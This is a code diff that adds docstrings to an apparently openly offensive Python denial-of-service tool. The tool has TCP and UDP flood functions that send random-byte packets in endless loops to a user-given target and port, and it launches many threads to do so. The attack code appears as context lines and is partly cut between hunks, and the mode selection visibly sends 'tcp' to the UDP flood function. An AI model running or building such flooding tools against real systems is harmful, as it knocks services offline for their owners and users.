@@ -19,12 +19,19 @@ RESET = Fore.RESET
 
 
 class Dos():
+    """
+    Dos Class for the main dos functions
+    """
 
     def size(self, buffer_size):
+        """ Make bytes from the user given buffer size """
+
         size = os.urandom(min(65500, buffer_size))
         return size
 
     def tcp_flood(self, ip, port, buffer_size):
+        """ TCP flood function """
+
         while True:
             try:
                 data = self.size(buffer_size)
@@ -36,6 +43,8 @@ class Dos():
                 sys.exit(0)
 
     def udp_flood(self, ip, port, buffer_size):
+        """ UDP flood function """
+
         while True:
             try:
                 data = self.size(buffer_size)
@@ -46,6 +55,9 @@ class Dos():
                 sys.exit(0)
 
 class Controller(Dos):
+    """
+    Controller Class to serve the right Arguments to Dos Class
+    """
 
     def __init__(self):
         # Time
@@ -68,6 +80,8 @@ class Controller(Dos):
             """, self.lt)
 
     def arguments(self):
+        """ Argument Parser for user input """
+
         parser = ArgumentParser(description=self.banner_txt.replace("-V-", self.version))
         parser.add_argument("-t", "--target", dest="target_addr")
         parser.add_argument("-p", "--port", dest="port")
@@ -80,6 +94,8 @@ class Controller(Dos):
             return args.target_addr, args.port, args.dos_mode, args.amount, args.buffer_size
 
     def check_args(self, args):
+        """ Check from user given arguments """
+
         if args.target_addr and args.port and args.dos_mode and args.amount and args.buffer_size:
             try:
                 args.port = int(args.port)
@@ -93,6 +109,8 @@ class Controller(Dos):
             sys.exit(0)
 
     def get_fqdm(self, target_addr):
+        """ Get Fully qualified domain name from the www.domain.com form"""
+
         try:
             target_ip = socket.gethostbyname(target_addr)
             return target_ip
@@ -101,6 +119,8 @@ class Controller(Dos):
             sys.exit(0)
 
     def threads(self, amount, dos_mode, target_ip, port, buffer_size):
+        """ Threading function to give arguments to dos class and start multiple threads """
+
         if dos_mode == 'tcp':
             self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
         elif dos_mode == 'udp':
@@ -116,6 +136,8 @@ class Controller(Dos):
                 continue
 
     def run(self):
+        """ Run function to start everything """
+
         target_addr, port, dos_mode, amount, buffer_size = self.arguments()
         target_ip = self.get_fqdm(target_addr)
         self.threads(amount, dos_mode, target_ip, port, buffer_size)
